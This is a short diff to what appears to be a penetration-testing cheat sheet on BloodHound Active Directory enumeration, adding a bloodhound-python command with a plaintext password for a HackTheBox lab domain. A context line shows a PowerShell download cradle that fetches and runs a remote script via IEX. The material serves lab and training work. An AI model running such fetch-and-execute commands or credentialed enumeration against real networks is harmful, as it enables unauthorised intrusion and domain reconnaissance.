@@ -160,6 +160,10 @@ powershell.exe -exec Bypass -C "IEX(New-Object Net.Webclient).DownloadString('ht
 
 # Metasploit
 use post/windows/gather/bloodhound       
+
+
+# Run from Kali Box
+bloodhound-python -c ALL -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -d support.htb -ns 10.10.11.174
 ```
 
 ### Bloodhound-python
